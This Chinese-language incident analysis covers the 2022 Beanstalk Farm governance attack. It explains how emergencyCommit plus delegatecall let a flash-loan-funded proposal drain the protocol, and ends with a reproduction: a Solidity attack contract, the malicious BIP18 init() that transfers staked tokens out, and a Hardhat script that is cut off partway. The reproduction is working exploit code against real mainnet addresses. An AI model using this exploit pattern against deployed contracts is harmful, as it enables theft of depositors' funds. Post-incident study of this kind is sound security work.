# Beanstalk 攻击事件分析与复现

## 事件概述

4月17日，ETH 上稳定币协议 Beanstalk Farm 遭到闪电贷攻击，项目方损失约 8000万美元。

Beanstalk 协议中的提案管理合约 GovernanceFacet.emergencyCommit 函数可以在提案投票结束前立即执行投票占比大于2/3且创建时间大于一天的提案，执行过程中会以 GovernanceFacet 的身份执行提案合约的 init 函数（delegatecall）。

攻击者首先在攻击发生一天前部署设置了一个恶意提案，其初始化函数会将 Beanstalk 协议内的资金转出到攻击合约地址，在攻击发生当天通过闪电贷取得足够多的投票代币使得该提案通过。由于提案通过时会以 delegatecall 调用对应合约的 init 函数，所以攻击者可以凭借这一漏洞偷走项目内资金。

## Beanstalk 项目简介

Beanstalk 是一个算法稳定币项目，每个BeanToken都对应着1USD。Beanstalk 采用 DAO 的形式由社区进行管理和协议升级（该 DAO 称之为 Silo），只要在DAO中质押项目制订的白名单中的代币，任何人都可以成为DAO中的一员，进行项目提案投票以及获得额外的质押奖励。

Silo 白名单包括：

1. Bean：0xDC59ac4FeFa32293A95889Dc396682858d52e5Db
2. Bean&WETH UniswapPairLP：0x87898263B6C5BABe34b4ec53F22d98430b91e371
3. BEAN:3CRV Curve LP Tokens：0x3a70DfA7d2262988064A2D051dd47521E43c9BdD
4. BEAN:LUSD Curve LP Tokens：0xD652c40fBb3f06d6B58Cb9aa9CFF063eE63d465D

用户向协议中质押白名单中的代币会根据不同的计算公式获得对应数量的 Stalk（Silo 治理代币），并且记录用户所拥有的Stalk在当前项目总质押代币中的相应占比。具体计算公式见项目白皮书：https://bean.money/docs/beanstalk.pdf

在用户得到Stalk的同时也会得到对应的roots，计算公式为：roots = totalRoots * stalk / totalStalk ，而后将用户产生的roots累加到totalRoots中。代码如下（0x448d330affa0ad31264c2e6a7b5d2bf579608065）：

```solidity
    function incrementBalanceOfStalk(address account, uint256 stalk) internal {
        AppStorage storage s = LibAppStorage.diamondStorage();
        uint256 roots;
        if (s.s.roots == 0) roots = stalk.mul(C.getRootsBase());
        else roots = s.s.roots.mul(stalk).div(s.s.stalk);

        s.s.stalk = s.s.stalk.add(stalk);
        s.a[account].s.stalk = s.a[account].s.stalk.add(stalk);

        s.s.roots = s.s.roots.add(roots);
        s.a[account].roots = s.a[account].roots.add(roots);

        incrementBipRoots(account, roots);
    }
```

用户进行提案时，会对用户的roots进行检查，需满足：userRoots / totalRoots > governanceProposalThreshold。关键代码如下（0xf480ee81a54e21be47aa02d0f9e29985bc7667c4）：

```solidity
    function propose(
        IDiamondCut.FacetCut[] calldata _diamondCut,
        address _init,
        bytes calldata _calldata,
        uint8 _pauseOrUnpause
    )
        external
    {
        require(canPropose(msg.sender), "Governance: Not enough Stalk.");//check user roots
        require(notTooProposed(msg.sender), "Governance: Too many active BIPs.");
        require(
            _init != address(0) || _diamondCut.length > 0 || _pauseOrUnpause > 0,
            "Governance: Proposition is empty."
        );

        uint32 bipId = createBip(
            _diamondCut,
            _init,
            _calldata,
            _pauseOrUnpause,
            C.getGovernancePeriod(),
            msg.sender
        );

        s.a[msg.sender].proposedUntil = startFor(bipId).add(periodFor(bipId));
        emit Proposal(msg.sender, bipId, season(), C.getGovernancePeriod());

        _vote(msg.sender, bipId);
    }
    
    function canPropose(address account) internal view returns (bool) {
        if (totalRoots() == 0 || balanceOfRoots(account) == 0) {
            return false;
        }
        Decimal.D256 memory stake = Decimal.ratio(balanceOfRoots(account), totalRoots());
        return stake.greaterThan(C.getGovernanceProposalThreshold());// threshold is 0.1%
    }
    
    function ratio(uint256 a, uint256 b)internal pure returns (D256 memory){
        return D256({ value: getPartial(a, BASE, b) }); // BASE is 1e18
    }
    
    function getPartial(uint256 target, uint256 numerator, uint256 denominator ) private pure returns (uint256){
        return target.mul(numerator).div(denominator);
    }
```

综上，如果一个新用户想要生成新提案的话，那么需要满足以下等式：

1. userStalk = tokenAmount * tokenToStalkRatio
2. userRoots = totalRoots * userStalk / totalRoots
3. totalRootsNew = totalRoots + userRoots
4. userRoots / totalRootsNew > governanceProposalThreshold

经过简单推导可以得出，用户需要向协议中质押的 tokenAmount 数量需要满足：

**tokenAmount > (governanceProposalThreshold * totalStalk) / (1 - governanceProposalThreshold) / tokenToStalkRatio**

其中，governanceProposalThreshold为常数0.1%。

提案生成后，需要Silo成员通过vote函数向提案进行投票，会将用户所拥有的所有roots全部记录在该提案中。相关代码（0xf480ee81a54e21be47aa02d0f9e29985bc7667c4）：

```solidity
    function vote(uint32 bip) external {
        require(balanceOfRoots(msg.sender) > 0, "Governance: Must have Stalk.");
        require(isNominated(bip), "Governance: Not nominated.");
        require(isActive(bip), "Governance: Ended.");
        require(!voted(msg.sender, bip), "Governance: Already voted.");

        _vote(msg.sender, bip);
    }
    function _vote(address account, uint32 bipId) internal {
        recordVote(account, bipId);
        placeVotedUntil(account, bipId);

        emit Vote(account, bipId, balanceOfRoots(account));
    }

    function recordVote(address account, uint32 bipId) internal {
        s.g.voted[bipId][account] = true;
        s.g.bips[bipId].roots = s.g.bips[bipId].roots.add(balanceOfRoots(account));
    }
    function placeVotedUntil(address account, uint32 bipId) internal {
        uint32 newLock = startFor(bipId).add(periodFor(bipId));
        if (newLock > s.a[account].votedUntil) {
                s.a[account].votedUntil = newLock;
        }
    }
```

在提案投票结束并且投票后，若投票数大于结束时totalRoots，则可以通过调用commit函数来执行该提案中的内容：

```solidity
    function commit(uint32 bip) external {
        require(isNominated(bip), "Governance: Not nominated.");
        require(!isActive(bip), "Governance: Not ended.");
        require(!isExpired(bip), "Governance: Expired.");
        require(
            endedBipVotePercent(bip).greaterThanOrEqualTo(C.getGovernancePassThreshold()), // threshold = 50%
            "Governance: Must have majority."
        );
        _execute(msg.sender, bip, true, true); 
    }
    function endedBipVotePercent(uint32 bipId) internal view returns (Decimal.D256 memory) {
        return Decimal.ratio(s.g.bips[bipId].roots,s.g.bips[bipId].endTotalRoots);
    }
    function endBip(uint32 bipId) internal {
        uint256 i = 0;
        while(s.g.activeBips[i] != bipId) i++;
        s.g.bips[bipId].timestamp = uint128(block.timestamp);
        s.g.bips[bipId].endTotalRoots = totalRoots();
        uint256 numberOfActiveBips = s.g.activeBips.length-1;
        if (i < numberOfActiveBips) s.g.activeBips[i] = s.g.activeBips[numberOfActiveBips];
        s.g.activeBips.pop();
    }
    
```

执行提案中的代码是通过调用\_execute函数完成，具体调用链为：\_execute -> cutBip -> diamondCut -> initializeDiamondCut -> \_init.delegatecall(_calldata)

其中\_init 和_calldata 为提案创建时传入的参数。

```solidity
    function _execute(address account, uint32 bip, bool ended, bool cut) private {
        if (!ended) endBip(bip);
        s.g.bips[bip].executed = true;

        if (cut) cutBip(bip);
        pauseOrUnpauseBip(bip);

        incentivize(account, ended, bip, C.getCommitIncentive());
        emit Commit(account, bip);
    }
    function cutBip(uint32 bipId) internal {
        if (diamondCutIsEmpty(bipId)) return;
        LibDiamond.diamondCut(
            s.g.diamondCuts[bipId].diamondCut,
            s.g.diamondCuts[bipId].initAddress,
            s.g.diamondCuts[bipId].initData
        );
    }
    function diamondCut(
        IDiamondCut.FacetCut[] memory _diamondCut,
        address _init,
        bytes memory _calldata
    ) internal {
        for (uint256 facetIndex; facetIndex < _diamondCut.length; facetIndex++) {
            IDiamondCut.FacetCutAction action = _diamondCut[facetIndex].action;
            if (action == IDiamondCut.FacetCutAction.Add) {
                addFunctions(_diamondCut[facetIndex].facetAddress, _diamondCut[facetIndex].functionSelectors);
            } else if (action == IDiamondCut.FacetCutAction.Replace) {
                replaceFunctions(_diamondCut[facetIndex].facetAddress, _diamondCut[facetIndex].functionSelectors);
            } else if (action == IDiamondCut.FacetCutAction.Remove) {
                removeFunctions(_diamondCut[facetIndex].facetAddress, _diamondCut[facetIndex].functionSelectors);
            } else {
                revert("LibDiamondCut: Incorrect FacetCutAction");
            }
        }
        emit DiamondCut(_diamondCut, _init, _calldata);
        initializeDiamondCut(_init, _calldata);
    }
    function initializeDiamondCut(address _init, bytes memory _calldata) internal {
        if (_init == address(0)) {
            require(_calldata.length == 0, "LibDiamondCut: _init is address(0) but_calldata is not empty");
        } else {
            require(_calldata.length > 0, "LibDiamondCut: _calldata is empty but _init is not address(0)");
            if (_init != address(this)) {
                enforceHasContractCode(_init, "LibDiamondCut: _init address has no code");
            }
            (bool success, bytes memory error) = _init.delegatecall(_calldata);
            if (!success) {
                if (error.length > 0) {
                    // bubble up the error
                    revert(string(error));
                } else {
                    revert("LibDiamondCut: _init function reverted");
                }
            }
        }
    }
```

### 漏洞成因

除了上面提到的commit函数可以执行提案逻辑之外，Silo为了应对突发事件实现了emergencyCommit函数，允许提案生成时间超过24小时并且投票数占比超过2/3的提案在投票期结束前直接执行，并且由于上文提到的执行方式是delegatecall调用，所以攻击者完全可以在提案生成24小时后运用闪电贷强制执行恶意提案逻辑转走协议内其他用户质押的资产。

```solidity
    function emergencyCommit(uint32 bip) external {
        require(isNominated(bip), "Governance: Not nominated.");
        require(
            block.timestamp >= timestamp(bip).add(C.getGovernanceEmergencyPeriod()),//86400 = 24hrs
            "Governance: Too early.");
        require(isActive(bip), "Governance: Ended.");
        require(
            bipVotePercent(bip).greaterThanOrEqualTo(C.getGovernanceEmergencyThreshold()),//2/3
            "Governance: Must have super majority."
        );
        _execute(msg.sender, bip, false, true); 
    }
```



## 攻击流程细节

### 攻击者地址

[0x1c5dcdd006ea78a7e4783f9e6021c32935a10fb4](https://etherscan.io/address/0x1c5dcdd006ea78a7e4783f9e6021c32935a10fb4)

### 攻击合约地址

伪造提案地址：[Create: InitBip18](https://etherscan.io/address/0x259a2795624b8a17bc7eb312a94504ad0f615d1e)（不是真正的BIP18，为攻击者部署的混淆视听的正常提案，其BIP编号为19，以下称之为 FakeBIP18）

恶意提案地址：[0xe5ecf73603d98a0128f05ed30506ac7a663dbb69 ](https://etherscan.io/address/0xe5ecf73603d98a0128f05ed30506ac7a663dbb69)（真正的恶意提案BIP18地址，为FakeBIP18的proposer地址，以下称之为True BIP8）

### 攻击相关hash

进行BIP18提案交易hash：[0x68cdec0ac76454c3b0f7af0b8a3895db00adf6daaf3b50a99716858c4fa54c6f](https://etherscan.io/tx/0x68cdec0ac76454c3b0f7af0b8a3895db00adf6daaf3b50a99716858c4fa54c6f)（TrueBIP18）

进行BIP19提案交易hash：[0x9575e478d7c542558ecca52b27072fa1f1ec70679106bdbd62f3bb4d6c87a80d](https://etherscan.io/tx/0x9575e478d7c542558ecca52b27072fa1f1ec70679106bdbd62f3bb4d6c87a80d)（FakeBIP18）

利用create2创建BIP18交易hash：[0x677660ce489935b94bf5ac32c494669a71ee76913ffabe623e82a7de8226b460](https://etherscan.io/tx/0x677660ce489935b94bf5ac32c494669a71ee76913ffabe623e82a7de8226b460)

攻击交易hash：[0xcd314668aaa9bbfebaf1a0bd2b6553d01dd58899c508d4729fa7311dc5d33ad7](https://etherscan.io/tx/0xcd314668aaa9bbfebaf1a0bd2b6553d01dd58899c508d4729fa7311dc5d33ad7)

### 攻击流程

### 前期准备工作

1. 用ETH购买一定数量的Bean，将其质押在协议中获得Stalk，以满足发起提案的要求。

   质押 Bean 换取 Stalk 的比率为10000，攻击者进行质押操作时 totalStalk 为 2008803818404909745，所以攻击者需要换取数量约为 200880381840 的 Bean （价值约20万美元）才能发起提案。

   算得所需要的 Bean 后即可以在 DEX 中使用 ETH 换取。

2. 创建FakeBIP18合约，合约代码如下：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

// Ukraine Donation Proposal
// Give 250,000 Bean to Ukraine (and 10,000 Bean to the proposer)

abstract contract IBean {
    function mint(address account, uint256 amount) public virtual returns (bool);
}

contract InitBip18 {
    address private constant bean = 0xDC59ac4FeFa32293A95889Dc396682858d52e5Db; // Bean Address
    address private constant proposerWallet = 0xE5eCF73603D98A0128F05ed30506ac7A663dBb69; // Proposer Wallet
    address private constant ukraineWallet = 0x165CD37b4C644C2921454429E7F9358d18A45e14; // Ukraine Wallet
    uint256 private constant proposerAmount = 10_000 * 1e6; // 10,000 Beans
    uint256 private constant donationAmount = 250_000 * 1e6; // 250,000 Beans

    function init() external {
        IBean(bean).mint(proposerWallet, proposerAmount);
        IBean(bean).mint(ukraineWallet, donationAmount);
    }
}
```

实际上FakeBIP18从没被调用过，攻击者创建此合约目的是迷惑管理方以及其他 DAO 成员。

3. 调用Beanstalk项目中GovernanceFacet.propose()函数，发起BIP18提案，调用参数如下：

```json
{
  "_diamondCut": [],
  "_init": "0xe5ecf73603d98a0128f05ed30506ac7a663dbb69",
  "_calldata": "0xe1c7392a",
  "_pauseOrUnpause": 3
}
```

即设置BIP18的 \_init 地址为 TrueBIP18（注意此时 TrueBIP18 还没有被创建），初始化函数参数为 init() 函数签名。

4. 发起BIP19提案，调用参数如下：

```json
{
  "_diamondCut": [],
  "_init": "0x259a2795624b8a17bc7eb312a94504ad0f615d1e",
  "_calldata": "0xe1c7392a",
  "_pauseOrUnpause": 3
}
```

BIP19 \_init 地址为FakeBIP18，调用参数同样为 init() 函数签名，这一步的目的同样是为了迷惑其他 DAO 成员，制造出 BIP18 提案正常的假象。

5. 向TrueBIP18地址转入0.25ETH。攻击者进行这一操作目的为将TrueBIP18地址伪装成EOA地址，即FakeBIP18中的Proposer Wallet，同样是攻击者的障眼法。

6. 等待一天，满足emergencyCommit时间要求。
7. 通过 create2 创建 TrueBIP18 合约。
8. 通过闪电贷获得大量Stalk，满足emergencyCommit的票数要求，强制使得BIP18通过并执行。

## 执行攻击

### 资金准备

跟据之前的分析，现在只需要通过闪电贷获得大量的 Stalk 使得攻击者拥有的 roots 大于等于 totalRoots 的 2/3 即可满足 emergencyCommit 的调用条件。不过通过之前的推导以及准备工作中算得的需要满足发起提案的资金对比可以知道，如果想满足emergencyWithdraw的调用条件，至少需要 20 * 10 * 66 * 1e10= 132\*1e12 个 Bean，即，但是在攻击发生前后，Weth&Bean UniswapPair 中 Bean 的储备仅为 28\*1e12 左右，所以仅凭借该交易对中的 Bean 不足以满足攻击条件。

Uniswap 中具体 Bean 存量如下（交易 hash：0xfdd9acbc3fae083d572a2b178c8ca74a63915841a8af572a10d0055dbe91d219）：

![image-20220511144139975](/Users/secundanirn/Documents/GitHub/s3cunDa.github.io/assets/post/image-20220511144139975.png)

不过 Silo 白名单中不仅仅只有 Bean 一种 token 可以进行质押换取 Stalk，攻击者采用闪电贷借出大量的 DAI、USDT、USDC、Bean、LUSD，将这些代币通过在交易所中兑换统一置换为BEAN:3CRV Curve LP Tokens，达成条件。

具体来说，攻击者在 AAVELendingPool 中通过闪电贷借取了3亿5千万DAI、5亿USDC以及1亿5千万USDT，随后又在对应的UniswapPair以及SushiswapPair中通过闪电贷获得了1100万LUSD以及3200万Bean，此时攻击者手里有价值超过10亿的资产，通过一系列的兑换操作后足以满足执行emergencyWithdraw的条件。

### 攻击获利

一旦攻击者成功调用 emergencyCommit，那么 BeansProtocol 会以 delegatecall 的形式调用提案合约地址中的函数（详见文章之前小节分析）：

```solidity
    function initializeDiamondCut(address _init, bytes memory _calldata) internal {
        if (_init == address(0)) {
            require(_calldata.length == 0, "LibDiamondCut: _init is address(0) but_calldata is not empty");
        } else {
            require(_calldata.length > 0, "LibDiamondCut: _calldata is empty but _init is not address(0)");
            if (_init != address(this)) {
                enforceHasContractCode(_init, "LibDiamondCut: _init address has no code");
            }
            (bool success, bytes memory error) = _init.delegatecall(_calldata);
            if (!success) {
                if (error.length > 0) {
                    // bubble up the error
                    revert(string(error));
                } else {
                    revert("LibDiamondCut: _init function reverted");
                }
            }
        }
    }
```

攻击者布置的 BIP18 提案合约的 init() 函数逻辑如下，会直接将协议内的质押资产转移到攻击合约中：

```solidity
function init() public{
        IERC20(0xDC59ac4FeFa32293A95889Dc396682858d52e5Db).transfer(msg.sender, IERC20(0xDC59ac4FeFa32293A95889Dc396682858d52e5Db).balanceOf(address(this)));//bean
        IERC20(0x87898263B6C5BABe34b4ec53F22d98430b91e371).transfer(msg.sender, IERC20(0x87898263B6C5BABe34b4ec53F22d98430b91e371).balanceOf(address(this)));//wethBeanLP
        IERC20(0x3a70DfA7d2262988064A2D051dd47521E43c9BdD).transfer(msg.sender, IERC20(0x3a70DfA7d2262988064A2D051dd47521E43c9BdD).balanceOf(address(this)));//beanCrv
        IERC20(0xD652c40fBb3f06d6B58Cb9aa9CFF063eE63d465D).transfer(msg.sender, IERC20(0xD652c40fBb3f06d6B58Cb9aa9CFF063eE63d465D).balanceOf(address(this)));//beanLusd
    }    
```

攻击者完成攻击和闪电贷还款流程后，将所有攻击所得在 DEX 内换为 ETH，最终获利24830个ETH。

![image-20220511154924377](/Users/secundanirn/Documents/GitHub/s3cunDa.github.io/assets/post/image-20220511154924377.png)

### 攻击复现

攻击合约：

```solidity
pragma solidity ^ 0.8.0;
import "hardhat/console.sol";
interface IERC20{
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external ;
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external;// returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function decimals() external view returns(uint);
}

interface IAAVEPool{
    function flashLoan(address,address[] calldata ,uint256[] calldata ,uint256[] calldata ,address onBehalfOf,bytes calldata ,uint16 referralCode) external;
}
interface IUniswapV2Pair{ //for uniswap flashloan
    function swap(uint , uint , address , bytes calldata ) external;
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function skim(address to) external;
    function burn(address) external;
}
interface ICRV{
    function add_liquidity( uint256[3] calldata, uint256) external;
    function add_liquidity( uint256[2] calldata, uint256) external;
    function exchange(int128, int128, uint256, uint256) external returns(uint);
    function remove_liquidity_one_coin(uint256, int128, uint256) external;
}
interface IBeanProtocol{
    enum FacetCutAction {Add, Replace, Remove}
    struct FacetCut {
        address facetAddress;
        FacetCutAction action;
        bytes4[] functionSelectors;
    }
    function propose(
        FacetCut[] calldata _diamondCut,
        address _init,
        bytes calldata _calldata,
        uint8 _pauseOrUnpause
    )
        external;
    function depositBeans(uint256) external;
    function vote(uint32) external;
    function emergencyCommit(uint32) external;
    function deposit(address, uint) external;
}
contract attack{
    address public beanTokenAddress         = 0xDC59ac4FeFa32293A95889Dc396682858d52e5Db;
    address public usdcAddress              = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address public daiAddress               = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address public usdtAddress              = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address public crvDepositor             = 0xA79828DF1850E8a3A3064576f380D90aECDD3359;
    address public crvDTCPool               = 0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7;
    address public crvDTC                   = 0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490;
    address public lusdCrvAddress           = 0xEd279fDD11cA84bEef15AF5D39BB4d4bEE23F0cA;
    address public lusdAddress              = 0x5f98805A4E8be255a32880FDeC7F6728C6568bA0;
    address public beanCrvAddress           = 0x3a70DfA7d2262988064A2D051dd47521E43c9BdD;
    address public beanLusdAddress          = 0xD652c40fBb3f06d6B58Cb9aa9CFF063eE63d465D;
    address public aavePoolAddress          = 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9;
    address public beanProtocolAddress      = 0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5;
    address public wethBeanUniPairAddress   = 0x87898263B6C5BABe34b4ec53F22d98430b91e371;
    address public wethAddress              = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public router                   = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public lusdOhmUniPairAddress    = 0x46E4D8A1322B9448905225E52F914094dBd6dDdF;
    address public weth                     = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;


    function profit() public{
        //prepare
        IERC20(beanTokenAddress).approve(crvDepositor, type(uint).max);
        IERC20(usdcAddress).approve(crvDepositor, type(uint).max);
        IERC20(daiAddress).approve(crvDepositor, type(uint).max);
        IERC20(usdtAddress).approve(crvDepositor, type(uint).max);
        IERC20(usdcAddress).approve(crvDTCPool, type(uint).max);
        IERC20(daiAddress).approve(crvDTCPool, type(uint).max);
        IERC20(usdtAddress).approve(crvDTCPool, type(uint).max);
        IERC20(crvDTC).approve(lusdCrvAddress, type(uint).max);
        IERC20(lusdAddress).approve(lusdCrvAddress, type(uint).max);
        IERC20(crvDTC).approve(beanCrvAddress, type(uint).max);
        IERC20(beanTokenAddress).approve(beanLusdAddress, type(uint).max);
        IERC20(lusdAddress).approve(beanLusdAddress, type(uint).max);
        IERC20(usdcAddress).approve(beanProtocolAddress, type(uint).max);
        IERC20(beanCrvAddress).approve(beanProtocolAddress, type(uint).max);
        IERC20(beanLusdAddress).approve(beanProtocolAddress, type(uint).max);
        IERC20(beanTokenAddress).approve(beanProtocolAddress, type(uint).max);
        IERC20(usdcAddress).approve(aavePoolAddress, type(uint).max);
        IERC20(daiAddress).approve(aavePoolAddress, type(uint).max);
        IERC20(usdtAddress).approve(aavePoolAddress, type(uint).max);
        
        IERC20(beanTokenAddress).approve(beanCrvAddress, type(uint).max);
        IERC20(lusdAddress).approve(beanCrvAddress, type(uint).max);
        uint256 usdtBefore = IERC20(usdtAddress).balanceOf(msg.sender);
        uint256 usdcBefore = IERC20(usdcAddress).balanceOf(msg.sender);
        uint256 daiBefore = IERC20(daiAddress).balanceOf(msg.sender);
        uint256 wethBefore = IERC20(weth).balanceOf(msg.sender);
        uint256 beanBefore = IERC20(beanTokenAddress).balanceOf(msg.sender);

        console.log("Attack Start!");
        {
        address[] memory addrArray = new address[](3);
        addrArray[0] = daiAddress;
        addrArray[1] = usdcAddress;
        addrArray[2] = usdtAddress;
        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 350*1e24;
        amounts[1] = 500*1e12;
        amounts[2] = 150*1e12;
        uint256[] memory types = new uint256[](3);
        IAAVEPool(aavePoolAddress).flashLoan(address(this),  addrArray,  amounts, types, address(this), new bytes(0), 0);
        }

        IERC20(wethBeanUniPairAddress).transfer(wethBeanUniPairAddress, IERC20(wethBeanUniPairAddress).balanceOf(address(this)));
        IUniswapV2Pair(wethBeanUniPairAddress).burn(address(this));

        IERC20(daiAddress).transfer(msg.sender, IERC20(daiAddress).balanceOf(address(this)));
        IERC20(usdcAddress).transfer(msg.sender, IERC20(usdcAddress).balanceOf(address(this)));
        IERC20(wethAddress).transfer(msg.sender, IERC20(wethAddress).balanceOf(address(this)));
        IERC20(usdtAddress).transfer(msg.sender, IERC20(usdtAddress).balanceOf(address(this)));
        IERC20(beanTokenAddress).transfer(msg.sender, IERC20(beanTokenAddress).balanceOf(address(this)));
        console.log("Attack complete!!!");
        uint usdtProfit = (IERC20(usdtAddress).balanceOf(msg.sender) - usdtBefore)/(10**IERC20(usdtAddress).decimals());
        uint daiProfit  = (IERC20(daiAddress).balanceOf(msg.sender) - daiBefore)/(10**IERC20(daiAddress).decimals());
        uint usdcProfit = (IERC20(usdcAddress).balanceOf(msg.sender) - usdcBefore)/(10**IERC20(usdcAddress).decimals());
        uint beanProfit = (IERC20(beanTokenAddress).balanceOf(msg.sender) - beanBefore)/(10**IERC20(beanTokenAddress).decimals());
        uint wethProfit = (IERC20(weth).balanceOf(msg.sender) - wethBefore)/(10**IERC20(weth).decimals());
        console.log("Attacker profit:");
        console.log("usdt:  %s USD", usdtProfit);
        console.log("dai:   %s USD", daiProfit);
        console.log("usdc:  %s USD", usdcProfit);
        console.log("bean:  %s USD", beanProfit);
        console.log("weth:  %s", wethProfit);
        console.log("total: %s USD and %s ETH", 
            usdtProfit + usdcProfit + daiProfit + beanProfit,
            wethProfit
        );
    }
    function bytesToAddress(bytes memory bys) public pure returns (address addr) {
      assembly {
        addr := mload(add(bys,20))
      }
    }
    function executeOperation(address[] calldata ,uint256[] calldata ,uint256[] calldata ,address ,bytes calldata ) external returns (bool){
        uint112 loan;
        (,loan,)= IUniswapV2Pair(wethBeanUniPairAddress).getReserves();
        IUniswapV2Pair(wethBeanUniPairAddress).swap(0, loan - 1, address(this), abi.encodePacked(beanTokenAddress));
        IUniswapV2Pair(wethBeanUniPairAddress).skim(address(this));
        ICRV(lusdCrvAddress).exchange(int128(0), int128(1), IERC20(lusdAddress).balanceOf(address(this)) , uint256(0));
        uint LPremain = IERC20(crvDTC).balanceOf(address(this));
        ICRV(crvDTCPool).remove_liquidity_one_coin(LPremain/2, 1, 0);
        ICRV(crvDTCPool).remove_liquidity_one_coin(LPremain*35/100, 0, 0);
        ICRV(crvDTCPool).remove_liquidity_one_coin(IERC20(crvDTC).balanceOf(address(this)), 2, 0);
        return true;
  }
    function uniswapV2Call(address , uint amount0, uint amount1, bytes calldata data) external{
        address token   = bytesToAddress(data);
        if(token == beanTokenAddress){
            uint112 loan;
            (loan,,) = IUniswapV2Pair(lusdOhmUniPairAddress).getReserves();
            IUniswapV2Pair(lusdOhmUniPairAddress).swap(loan - 1, 0, address(this), abi.encodePacked(lusdAddress)); 
            IUniswapV2Pair(lusdOhmUniPairAddress).skim(address(this));
            IERC20(token).transfer(msg.sender, amount1*103/100);
        }
        else if(token == lusdAddress){
            {
            uint DAIbalance = IERC20(daiAddress).balanceOf(address(this));
            uint USDCbalance = IERC20(usdcAddress).balanceOf(address(this));
            uint USDTbalance = IERC20(usdtAddress).balanceOf(address(this));
            uint256[3] memory amounts1;
            amounts1[0] = DAIbalance;
            amounts1[1] = USDCbalance;
            amounts1[2] = USDTbalance;
            ICRV(crvDTCPool).add_liquidity(amounts1, 0);
            }
            ICRV(lusdCrvAddress).exchange(int128(1), int128(0), amount0 , uint256(0));

            uint256[2] memory amounts2;
            amounts2[0] = 0;
            amounts2[1] = IERC20(crvDTC).balanceOf(address(this));
            ICRV(beanCrvAddress).add_liquidity(amounts2, 0);

            uint256[2] memory amounts3;
            amounts3[0] = IERC20(beanTokenAddress).balanceOf(address(this));
            amounts3[1] = IERC20(lusdAddress).balanceOf(address(this));

            ICRV(beanLusdAddress).add_liquidity(amounts3, 0);

            IBeanProtocol(beanProtocolAddress).deposit(beanCrvAddress, IERC20(beanCrvAddress).balanceOf(address(this)));
            IBeanProtocol(beanProtocolAddress).vote(18);
            IBeanProtocol(beanProtocolAddress).emergencyCommit(18);



            ICRV(beanCrvAddress).remove_liquidity_one_coin(IERC20(beanCrvAddress).balanceOf(address(this)), int128(1), 0);
            ICRV(beanLusdAddress).remove_liquidity_one_coin(IERC20(beanLusdAddress).balanceOf(address(this)), int128(1), 0);

            IERC20(token).transfer(msg.sender, amount0*103/100);
        }
    }
}

```

BIP18:

```solidity
pragma solidity ^ 0.8.0;
interface IERC20{
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}
interface Irouter{
        function swapExactETHForTokens(uint , address[] calldata , address , uint)
        external
        payable
        returns (uint[] memory amounts);
}
contract BIP18{
        address public router                   = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        address public weth                     = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        address public beanTokenAddress         = 0xDC59ac4FeFa32293A95889Dc396682858d52e5Db;
    function init() public{
        IERC20(0xDC59ac4FeFa32293A95889Dc396682858d52e5Db).transfer(msg.sender, IERC20(0xDC59ac4FeFa32293A95889Dc396682858d52e5Db).balanceOf(address(this)));//bean
        IERC20(0x87898263B6C5BABe34b4ec53F22d98430b91e371).transfer(msg.sender, IERC20(0x87898263B6C5BABe34b4ec53F22d98430b91e371).balanceOf(address(this)));//wethBeanLP
        IERC20(0x3a70DfA7d2262988064A2D051dd47521E43c9BdD).transfer(msg.sender, IERC20(0x3a70DfA7d2262988064A2D051dd47521E43c9BdD).balanceOf(address(this)));//beanCrv
        IERC20(0xD652c40fBb3f06d6B58Cb9aa9CFF063eE63d465D).transfer(msg.sender, IERC20(0xD652c40fBb3f06d6B58Cb9aa9CFF063eE63d465D).balanceOf(address(this)));//beanLusd
    }    
    function getSomeBeans() external payable returns (uint){
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = beanTokenAddress;
        uint256[] memory res;
        res = Irouter(router).swapExactETHForTokens{value:msg.value}(211000000000, path, msg.sender, block.timestamp);
        return res[1];
    }
}
```

Exp:

```javascript
const hre = require("hardhat");



async function main() {

    const ATTACKER = "0x28C6c06298d514Db089934071355E5743bf21d60";
    const BEANPROTOCOL = "0xc1e088fc1323b20bcbee9bd1b9fc9546db5624c5";
    const BEAN = "0xDC59ac4FeFa32293A95889Dc396682858d52e5Db";
    await hre.network.provider.request({
        method: "hardhat_impersonateAccount",
        params: [ATTACKER],
    });
    const signer = await hre.ethers.getSigner(ATTACKER);
    
    let BIP18 = await hre.ethers.getContractFactory("BIP18",signer);
    const bip18 = await BIP18.deploy();
    await bip18.deployed();
    console.log("bip18 contract deployed to:", bip18.address);

    let ATTACK = await hre.ethers.getContractFactory("attack",signer);
    const attack = await ATTACK.deploy();
    await attack.deployed();
    console.log("attack contract deployed to:", attack.address);


    
    const BeanProtocol = await hre.ethers.getContractAt("contracts/attack.sol:IBeanProtocol", BEANPROTOCOL, signer);
    const Bean = await hre.ethers.getContractAt("contracts/attack.sol:IERC20", BEAN, signer);
    
    
    console.log("step 1: get some beans and make a proposal.");
    const depositAmount = await bip18.getSomeBeans({
        value: hre.ethers.utils.parseEther("73.0")
    });
    await Bean.approve(BEANPROTOCOL, 211000000000);
    await BeanProtocol.depositBeans(211000000000);
    await BeanProtocol.propose([], bip18.address, "0xe1c7392a", 3);
